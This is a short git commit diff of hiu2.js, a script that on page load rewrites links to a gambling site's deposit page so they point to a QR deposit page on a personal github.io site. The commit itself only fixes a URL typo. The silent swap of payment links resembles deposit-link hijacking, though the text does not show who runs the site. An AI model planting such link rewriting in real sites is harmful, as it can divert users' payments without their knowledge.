a5d90afb5c880da4cab29809a9979db40a775290
inggarfi <inggarsaput@gmail.com>
2025-05-23 00:17:37 +0700

    Update hiu2.js

--- hiu2.js
+++ hiu2.js
@@ -1,6 +1,6 @@
 document.addEventListener("DOMContentLoaded", function () {
   // Seleksi semua elemen <a>
-  document.querySelectorAll('a[href="https://hiuwin88.site//m/account/deposit"]').forEach(function (el) {
+  document.querySelectorAll('a[href="https://hiuwin88.site/m/account/deposit"]').forEach(function (el) {
     // Ganti href
     el.setAttribute("href", "https://inggarfi.github.io/instantdepositqr/deposithiu88.html");
 
